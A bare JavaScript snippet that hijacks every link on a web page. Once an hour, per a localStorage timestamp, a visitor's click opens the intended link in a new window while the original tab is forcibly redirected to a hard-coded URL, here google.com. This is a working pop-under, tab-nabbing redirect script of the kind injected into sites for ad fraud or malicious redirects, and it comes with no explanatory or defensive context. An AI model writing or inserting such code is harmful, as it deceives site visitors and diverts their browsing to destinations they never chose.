window.onload = function() {
  var hilURL = 'https://google.com';
  var hilTS = Math.round(+new Date()/1000);
  console.log('T.'+localStorage.hilTS+'/'+hilTS);
  if (typeof localStorage.hilTS == 'undefined' || parseInt(localStorage.hilTS) <= (hilTS - 3600)) {
    var links = document.getElementsByTagName('a');
    for(var i = 0, len = links.length; i < len; i++) {
      links[i].onclick = function (e) {
        var hilHref = this.getAttribute("href");
          var hilTarget = this.getAttribute("target");
          if (hilHref !== '#' && hilHref !== 'javascript:void(0)') {
          e.preventDefault();    
          if (hilTarget == '_blank') {
            window.open(window.location.href);
          }
          window.open(hilHref);
          window.location.href = hilURL;
          localStorage.hilTS = hilTS;
        }
      }
    }
  }
};